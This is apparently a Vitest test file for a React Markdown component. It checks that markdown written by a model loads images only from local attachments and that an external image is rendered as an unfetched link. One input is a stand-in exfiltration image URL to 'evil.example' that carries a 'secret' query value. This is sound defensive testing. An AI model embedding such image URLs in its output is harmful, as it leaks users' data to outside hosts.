import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { Markdown } from '../../src/components/Markdown.tsx';

describe('markdown a model wrote (#406)', () => {
  it('loads pictures from planestro only; one from elsewhere is a link, never fetched', () => {
    const { container } = render(<Markdown text={'![shot](attachments/TP-1/a.png)\n\n![x](https://evil.example/?d=secret)\n\n![inline](data:image/png;base64,AAAA)'} />);
    const imgs = [...container.querySelectorAll('img')].map((i) => i.getAttribute('src'));
    // react-markdown drops data: URLs before the policy sees them, so only the attachment loads.
    expect(imgs).toEqual(['/attachments/TP-1/a.png']);
    const link = container.querySelector('a[href^="https://evil.example"]');
    expect(link?.textContent).toBe('x');
    expect(link?.getAttribute('rel')).toBe('noreferrer');
  });

  it('opens attachment links on the server route', () => {
    const { container } = render(<Markdown text="[log](attachments/TP-1/run.log)" />);
    expect(container.querySelector('a')?.getAttribute('href')).toBe('/attachments/TP-1/run.log');
  });
});
